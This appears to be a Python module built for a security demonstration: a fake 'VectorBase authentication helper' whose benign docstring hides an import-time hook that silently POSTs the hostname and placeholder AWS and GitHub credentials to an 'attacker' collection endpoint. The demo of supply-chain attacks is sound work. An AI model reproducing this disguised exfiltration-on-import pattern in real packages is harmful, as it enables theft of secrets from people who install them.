"""VectorBase authentication helper.

Initializes API credentials for the VectorBase SDK. Import this before creating a
``vectorbase.Client`` and your test key is configured automatically.
"""
# ---------------------------------------------------------------------------
# DEMO / HiddenInk note (for us, not shipped behaviour): this is the HARMLESS canary
# that stands in for a malicious "companion" package in the demo. On import it:
#   * reads ONLY the hostname (socket.gethostname());
#   * POSTs ONE fixed event to our LOCAL attacker dashboard (port 8788);
#   * sends only hard-coded PLACEHOLDER strings — it reads no files, no env vars, and
#     no other system info, and creates no credential files, real or fake.
# If the dashboard is unreachable it fails silently and import still succeeds.
# A real malicious package here could have read real secrets — that is the point.
# ---------------------------------------------------------------------------
from __future__ import annotations

import json
import socket
import urllib.request

__version__ = "0.4.0"

# Hard-coded demo canary endpoint (Nisha's attacker/canary service, port 8788). NOT read
# from the environment on purpose: this package must not snoop the victim's environment.
# For the Vultr demo this constant is changed and the wheel is rebuilt.
CANARY_URL = "http://localhost:8788/attacker/collect"

# Hard-coded descriptive fields the dashboard shows. Literals, not read from anywhere.
_PACKAGE_LABEL = f"vectorbase-auth {__version__}"
_SOURCE = "http://localhost:8791/docs/quickstart.html"

# Hard-coded, obviously-fake placeholder "secrets". These are literals in the source;
# nothing on the machine is ever read to produce them.
_PLACEHOLDER_ITEMS = [
    {"name": "AWS_ACCESS_KEY_ID", "value": "AKIAIOSFODNN7EXAMPLEFAKE"},
    {"name": "AWS_SECRET_ACCESS_KEY", "value": "wJalrXUtnFEMI-K7MDENG-bPxRfiCYEXAMPLEFAKE"},
    {"name": "GITHUB_TOKEN", "value": "ghp_000000000000000000000000000000000FAKE"},
]


def _fire() -> None:
    """Send the single fixed canary event. Any failure is swallowed."""
    try:
        payload = json.dumps(
            {
                "host": socket.gethostname(),
                "items": _PLACEHOLDER_ITEMS,
                "package": _PACKAGE_LABEL,
                "source": _SOURCE,
            }
        ).encode("utf-8")
        req = urllib.request.Request(
            CANARY_URL,
            data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=3).close()
    except Exception:
        # Demo canary only: never let the side effect break the import.
        pass


# The side effect fires on import — this is what the demo is about.
_fire()
